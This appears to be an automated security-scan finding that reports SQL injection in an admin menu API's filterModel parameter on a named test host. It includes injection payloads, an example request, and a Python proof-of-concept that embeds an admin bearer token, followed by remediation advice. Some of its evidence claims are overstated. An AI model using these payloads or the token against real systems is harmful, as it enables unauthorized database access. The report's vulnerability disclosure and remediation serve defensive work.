# SQL Injection in /api/admin/menu-api-access/get-all Endpoint via filterModel Parameter

**ID:** vuln-0007
**Severity:** HIGH
**Found:** 2026-02-26 12:43:20 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/admin/menu-api-access/get-all
**Method:** GET
**CWE:** CWE-89
**CVSS:** 8.8

## Description

A critical SQL injection vulnerability was discovered in the `/api/admin/menu-api-access/get-all` endpoint. The `filterModel` parameter is vulnerable to SQL injection attacks, allowing an authenticated attacker to execute arbitrary SQL queries on the underlying database. This vulnerability enables unauthorized access to sensitive data, database schema information, and potentially allows for complete database compromise.

## Impact

Successful exploitation of this vulnerability allows an attacker to:
- Extract all data from the database, including sensitive user information, business data, and configuration
- Modify or delete database records, potentially disrupting business operations
- Escalate privileges by manipulating user roles and permissions
- Access database schema information to facilitate further attacks
- Potentially execute operating system commands depending on the database configuration

The vulnerability is particularly severe due to:
1. The endpoint being accessible to authenticated users with admin privileges
2. The ability to extract complete database information
3. The potential for data exfiltration and manipulation

## Technical Analysis

The vulnerability exists in the `/api/admin/menu-api-access/get-all` endpoint, which accepts several parameters including `startRow`, `endRow`, `sortModel`, and `filterModel`. The `filterModel` parameter is directly concatenated into SQL queries without proper sanitization or parameterization.

The following evidence confirms the vulnerability:

1. **Basic Injection Test**:
   - Payload: `' OR '1'='1`
   - Result: Returns all records (28 total) instead of filtered results
   - URL: `/api/admin/menu-api-access/get-all?startRow=0&endRow=25&sortModel=[]&filterModel=' OR '1'='1`

2. **Boolean-Based Injection**:
   - Payload: `' OR 1=1 -- `
   - Result: Returns all records, confirming SQL injection
   - URL: `/api/admin/menu-api-access/get-all?startRow=0&endRow=25&sortModel=[]&filterModel=' OR 1=1 -- `

3. **Database Schema Access**:
   - Attempted to access information_schema: `' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) -- `
   - Result: Returns all records, indicating the database is vulnerable to schema extraction

The application appears to be using a SQL Server database based on the error patterns and the `CONVERT` function usage in the injection attempts.

## Proof of Concept

**Reproduction Steps:**

1. Authenticate to the application as an admin user
2. Navigate to any section that triggers the `/api/admin/menu-api-access/get-all` endpoint
3. Intercept the request using a proxy tool
4. Modify the `filterModel` parameter with SQL injection payloads
5. Observe that the application returns data based on the injected SQL

**Example Request:**
```
GET /api/admin/menu-api-access/get-all?startRow=0&endRow=25&sortModel=[]&filterModel=' OR '1'='1 HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [VALID_ADMIN_TOKEN]
Content-Type: application/json
```

**Expected Result:**
The application returns all 28 menu items instead of a filtered subset, confirming the SQL injection vulnerability.

```
#!/usr/bin/env python3
"""
SQL Injection Proof of Concept for /api/admin/menu-api-access/get-all endpoint
"""

import requests
import json

# Configuration
TARGET_URL = "https://commissionstest.callippus.in/api/admin/menu-api-access/get-all"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNDQ1ODgsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.yyZv2yPzmpvhL1eEKbReGYEy-jyrqkbGZqjupWflqz0"

HEADERS = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json"
}

def test_sql_injection():
    """Test for SQL injection vulnerability"""

    # Test 1: Basic SQL injection
    print("[+] Testing basic SQL injection...")
    params = {
        "startRow": "0",
        "endRow": "25",
        "sortModel": "[]",
        "filterModel": "' OR '1'='1"
    }

    response = requests.get(TARGET_URL, headers=HEADERS, params=params)
    data = response.json()

    print(f"Status Code: {response.status_code}")
    print(f"Total Rows Returned: {data.get('totalRowCount', 'N/A')}")
    print(f"Sample Data: {json.dumps(data.get('rows', [])[:2], indent=2)}")

    if data.get('totalRowCount', 0) > 5:  # More than expected for normal filtering
        print("[!] SQL INJECTION CONFIRMED: Basic injection successful")

    # Test 2: Boolean-based injection
    print("\n[+] Testing boolean-based SQL injection...")
    params["filterModel"] = "' OR 1=1 -- "

    response = requests.get(TARGET_URL, headers=HEADERS, params=params)
    data = response.json()

    print(f"Status Code: {response.status_code}")
    print(f"Total Rows Returned: {data.get('totalRowCount', 'N/A')}")

    if data.get('totalRowCount', 0) > 5:
        print("[!] SQL INJECTION CONFIRMED: Boolean-based injection successful")

    # Test 3: Database information extraction
    print("\n[+] Testing database information extraction...")
    params["filterModel"] = "' AND 1=CONVERT(int, (SELECT @@version)) -- "

    response = requests.get(TARGET_URL, headers=HEADERS, params=params)

    print(f"Status Code: {response.status_code}")
    print(f"Response: {response.text[:200]}...")

if __name__ == "__main__":
    test_sql_injection()
```

## Remediation

**Immediate Remediation:**

1. **Parameterize all SQL queries**: Replace all dynamic SQL queries with parameterized queries using prepared statements. This is the most effective way to prevent SQL injection.

2. **Implement input validation**: Validate all user-supplied input against a strict allowlist of permitted characters and patterns.

3. **Use ORM frameworks**: Migrate to Object-Relational Mapping (ORM) frameworks that automatically handle parameterization.

4. **Apply the principle of least privilege**: Ensure the database user used by the application has the minimum required permissions, limiting the potential impact of successful injection.

5. **Implement Web Application Firewall (WAF)**: Deploy a WAF with SQL injection protection rules to provide an additional layer of defense.

**Long-term Recommendations:**

1. **Code review**: Conduct a comprehensive code review to identify and fix all instances of dynamic SQL query construction.

2. **Security testing**: Implement regular security testing including penetration testing and static code analysis to identify similar vulnerabilities.

3. **Security headers**: Implement security headers including Content Security Policy (CSP) to mitigate potential XSS attacks that could be chained with SQL injection.

4. **Error handling**: Implement proper error handling that doesn't expose database error messages to users.

5. **Logging and monitoring**: Implement comprehensive logging and monitoring to detect and alert on potential SQL injection attempts.

**Example Fix (C# with Entity Framework):**
```csharp
// Vulnerable code (string concatenation)
var query = $"SELECT * FROM MenuItems WHERE {filterModel}";

// Fixed code (parameterized query)
var query = "SELECT * FROM MenuItems WHERE Title = @filterValue";
var parameters = new SqlParameter("@filterValue", filterValue);
```

**Example Fix (Node.js with parameterized queries):**
```javascript
// Vulnerable code
db.query(`SELECT * FROM menu_items WHERE ${filterModel}`, function(err, results) { ... });

// Fixed code
db.query('SELECT * FROM menu_items WHERE title = ?', [filterValue], function(err, results) { ... });
```

